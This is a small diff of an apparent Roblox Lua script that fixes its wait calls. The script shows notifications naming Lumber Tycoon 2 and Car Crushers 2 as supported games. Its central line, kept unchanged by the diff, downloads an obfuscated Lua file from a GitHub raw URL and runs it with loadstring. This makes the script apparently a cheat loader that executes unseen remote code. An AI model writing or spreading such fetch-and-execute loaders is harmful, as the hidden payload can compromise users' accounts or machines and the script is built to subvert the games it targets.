@@ -3,9 +3,9 @@
         Text =  "720043327",
         Duration = 20
     })
-    wait.task()
+    task.wait()
 loadstring(game:HttpGet'https://raw.githubusercontent.com/Kggggg80/s/refs/heads/main/2-obfuscated%20(1).lua')()
-task.wait
+task.wait()
     game:GetService("StarterGui"):SetCore("SendNotification", {
         Title =  "支持的游戏",
         Text =  "木材大亨2/汽车破坏机2",
